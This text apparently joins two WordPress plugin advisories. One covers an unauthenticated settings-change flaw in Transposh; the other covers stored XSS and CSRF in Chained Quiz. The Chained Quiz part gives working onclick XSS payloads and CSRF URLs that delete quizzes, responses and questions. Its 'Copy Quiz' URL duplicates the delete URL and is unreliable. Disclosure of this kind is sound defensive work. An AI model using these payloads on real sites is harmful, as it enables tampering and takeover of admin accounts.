**Publication Date:** 2022-11-14

The Transposh WordPress Translation plugin for WordPress is vulnerable to unauthorized setting changes by unauthenticated users in versions up to, and including, 1.0.8.1. This is due to insufficient validation of settings on the ‘tp\_translation’ AJAX action which makes it possible for unauthenticated attackers to bypass any restrictions and influence the data shown on the site. Please note this is a separate issue from CVE-2022-2461. Notes from the researcher: When installed Transposh comes with a set of pre-configured options, one of these is the “Who can translate” setting under the “Settings” tab. However, this option is largely ignored, if Transposh has enabled its “autotranslate” feature (it’s enabled by default) and the HTTP POST parameter “sr0” is larger than 0. This is caused by a faulty validation in “wp/transposh\_db.php.”

# WordPress plugin Chained Quiz <= 1.3.2 multiple vulnerabilities

**Author: Muhammad Zeeshan (Xib3rR4dAr)**

Date: November 24, 2022

## XSS

**Description:**

Multiple endpoints are vulnerable to XSS. When a logged in admin will visit a URL shared by an attacker, XSS will trigger which can be exploited to add a new admin user on website.
`sanitize_text_field` is used while `esc_attr` should've been used.

**Vulnerable Files:**

```
chained-quiz/controllers/completed.php
chained-quiz/views/completed.html.php
and more

```

Similarly, other endpoints in the plugin are also vulnerable to Admin Stored XSS even if `DISALLOW_UNFILTERED_HTML` is set to `true`, some are:

* Visit [Social Sharing page](<http://example.com/wp-admin/admin.php?page=chainedquiz_social_sharing> as admin) and set Facebook App ID input to: `" onclick=alert(1) a`
* Visit [Integrations page](http://example.com/wp-admin/admin.php?page=chainedquiz_integrations&tab=mailchimp) as admin and set MailChimp API Key to : `" onclick=alert(1) a`

  XSS will trigger when input box will be clicked, or when page is hovered depending on XSS payload that is used.

```
POST /wp-admin/admin.php?page=chainedquiz_social_sharing
...
facebook_appid=" onclick=alert(1) a

POST /wp-admin/admin.php?page=chainedquiz_integrations&tab=mailchimp
...
api_key=someapikey" onclick=alert(1) a

```
## CSRF

Delete a quiz:

```
/wp-admin/admin.php?page=chained_quizzes&del=1&id=2

```

Delete submitted responses:

```
/wp-admin/admin.php?page=chainedquiz_list&quiz_id=1&offset=0&ob=tC.id&dir=desc&del=5

```

Delete a question from a quiz:

```
/wp-admin/admin.php?page=chainedquiz_questions&quiz_id=1&del=1&id=1

```

Copy Quiz:

```
/wp-admin/admin.php?page=chainedquiz_questions&quiz_id=1&del=1&id=1
